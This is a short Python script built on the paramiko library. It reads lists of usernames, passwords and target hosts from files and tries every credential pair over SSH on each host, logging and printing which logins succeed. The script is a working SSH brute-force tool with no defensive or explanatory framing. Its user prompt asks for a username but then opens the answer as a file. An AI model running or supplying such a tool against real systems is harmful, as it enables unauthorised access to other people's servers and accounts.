import paramiko
import time

# Define file paths
usernames_file = input("What username would you like to use?")
password_file = 'password.txt'
targets_file = 'targets.txt'

# Read usernames, passwords, and targets from files
with open(usernames_file, 'r') as f:
    usernames = f.read().splitlines()

with open(password_file, 'r') as f:
    passwords = f.read().splitlines()

with open(targets_file, 'r') as f:
    targets = f.read().splitlines()

results = []

# Loop through targets
for target in targets:
    # Initialize SSH client
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Loop through usernames and passwords
    for username in usernames:
        for password in passwords:
            try:
                # Attempt to connect to the target
                ssh.connect(target, username=username, password=password)
                results.append(f'Success: {username}@{target} with password {password}')
                print(f'Success: {username}@{target} with password {password}')
                ssh.close()
                break  # Exit password loop on successful connection
            except paramiko.AuthenticationException:
                results.append(f'Failed: {username}@{target} with password {password}')
                print(f'Failed: {username}@{target} with password {password}')
            except paramiko.SSHException as e:
                results.append(f'SSHException: {username}@{target} with password {password} - {str(e)}')
                print(f'SSHException: {username}@{target} with password {password} - {str(e)}')
                break  # Exit password loop on SSH error
            except Exception as e:
                results.append(f'Error: {username}@{target} with password {password} - {str(e)}')
                print(f'Error: {username}@{target} with password {password} - {str(e)}')
                break  # Exit password loop on general error
            time.sleep(1)  # Delay between attempts to avoid overwhelming the target

# Review results
for result in results:
    print(result)

print('Program complete.')
